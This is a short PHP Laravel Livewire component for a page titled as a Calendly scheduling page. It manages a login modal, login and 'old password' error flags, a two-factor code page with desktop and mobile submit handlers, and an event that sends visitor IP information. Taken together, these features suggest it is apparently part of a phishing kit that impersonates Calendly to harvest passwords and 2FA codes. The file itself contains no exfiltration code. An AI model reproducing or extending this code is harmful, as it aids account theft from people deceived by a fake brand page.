<?php

namespace App\Livewire;

use App\Models\IpInfo;
use Livewire\Attributes\Layout;
use Livewire\Attributes\Title;
use Livewire\Component;

class Home extends Component
{
    public $loginError = false;
    public $oldPassError = false;
    public $enableLoginForm = true;
    public $showModalFooter = true;
    public $enableLoadingAfterSubmit = false;
    public $twoFaPage = false;
    public $codeError = false;
    public $showCalender = false;
    public $showCalenderProgress = false;
    public $ip;
    protected $listeners = ['calender','calenderInit'];
    public function mount()
    {
        $this->dispatch('user-login-response');
    }

    public function codeSubmit()
    {
        $this->dispatch('code-submit');
    }
    public function codeSubmitMobile()
    {
        $this->dispatch('code-submit-mobile');
    }
    public function submitLogin()
    {
        $this->dispatch('show-login-progress');
    }
    public function openLoginModal()
    {
//        if ($this->ip){
//            IpInfo::create([
//                'ip' => $this->ip,
//            ]);
//        }

        $this->loginError = false;
        $this->dispatch('open-modal');
        $this->dispatch('send-ip-info');
    }

    public function calenderInit()
    {
        $this->dispatch('calender-init');
    }
    public function calender()
    {
        $this->redirect(route('calendar-calendly'),true);
    }
    #[Layout('app')]
    #[Title('Select a Date & Time - Calendly')]
    public function render()
    {
        return view('livewire.home');
    }
}
